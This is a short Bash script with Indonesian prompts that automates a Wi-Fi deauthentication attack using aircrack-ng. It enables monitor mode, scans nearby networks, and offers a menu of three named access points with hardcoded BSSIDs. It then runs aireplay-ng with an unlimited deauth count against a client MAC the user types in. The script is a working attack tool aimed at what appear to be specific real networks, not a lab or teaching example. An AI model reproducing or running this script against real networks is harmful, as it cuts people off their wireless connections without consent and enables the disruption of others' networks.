#!/bin/bash

#
# Artawgn
# Program ini uji coba di Ubuntu 16.04
# Semoga bermanfaat 	
#

main(){
	clear;
	echo "=====================";
	sudo airmon-ng;
	echo "=====================";
	echo "1. Hidupkan Monitor";  
	echo "2. Matikan Monitor";  
	echo "3. Status Monitor"; 
	echo "4. Scan Sekitar";
	echo "0. Keluar"; 
	echo "=====================";
	read  -p "Pilih  : " a
	if [[ $a == 1 ]]; then
		hidup;
		main;
	elif [[ $a == 2 ]]; then
		mati;
		main;
	elif [[ $a == 3 ]]; then
		status;
		main;
	elif [[ $a == 4 ]]; then
		sudo airodump-ng mon0;
		pilihScan;
	fi
}

hidup(){
	sudo airmon-ng start wlp9s0;
}
mati(){
	sudo airmon-ng stop mon0;
}
status(){
	sudo airmon-ng;
}
loading(){
	clear;
	echo	"Loading ";
	echo -ne '##                        (10%)\r'
	sleep 0.2
	echo -ne '#########                 (40%)\r'
	sleep 0.2
	echo -ne '###############           (80%)\r'
	sleep 0.2
	echo -ne '#####################     (90%)\r'
	sleep 0.2
	echo -ne '######################### (100%)\r'
	sleep 0.2
	echo -ne '\n'	
}
serang(){
	read  -p "INPUT MAC Target :" korban
	sudo aireplay-ng --deauth 0 -a $target -c $korban --ignore-negative-one mon0
	main;
}

pilihScan(){
	echo "";
	echo  "1 = BUjANGRESIDENCE";
	echo  "2 = BUjANGRESIDENCE_plus";
	echo  "3 = SoffA";
	read  -p "Pilih  : " pilih
	if [[ $pilih == 1 ]]; then
		target="98:DE:D0:BD:0F:E0";
	elif [[ $pilih == 2 ]]; then
		target="50:64:2B:25:F8:AB";
	elif [[ $pilih == 3 ]]; then
		target="34:CE:00:7A:8D:60";
	fi
	sudo airodump-ng --bssi $target mon0
	
	read  -p "Ingin Melakukan Serangan? (Y/N) : " serang
	if [[ $serang == y ]]; then
		serang;
	elif [[ $serang == Y ]]; then
		serang;
	elif [[ $serang == N ]]; then
		main;
	elif [[ $serang == n ]]; then
		main;
	fi
}

loading;
main;





